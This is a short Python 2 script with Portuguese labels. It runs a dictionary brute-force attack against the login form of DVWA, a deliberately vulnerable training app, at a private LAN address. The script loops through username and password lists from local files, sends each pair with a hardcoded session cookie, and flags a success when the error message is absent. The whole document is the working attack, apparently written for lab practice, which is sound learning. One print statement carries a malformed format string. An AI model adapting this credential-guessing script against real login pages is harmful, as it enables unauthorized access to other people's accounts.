#!/usr/bin/python

import urllib2

fuser = open('users.txt')
usuarios = fuser.read().split('\n')

fpass = open('pass.txt')
senhas = fpass.read().split('\n')

for usuario in usuarios:
    for senha in senhas:
        print "Testando.. %s : %" %(usuario, senha)
        url = "http://192.168.0.100/dvwa/vulnerabilities/brute/?username=%s&password=%s&Login=Login" %(usuario, senha)
        request = urllib2.Request(url)
        request.add_header('Cookie', 'security=low; PHPSESSID=4h91dkp7pcp8184nil8rt9ok13')
        response = urllib2.urlopen(request)
        result = response.read()
        if "Username and/or password incorrect." not in result:
            print "[+] Login e senha encontrados ==> %s:%s" %(usuario, senha)
            break
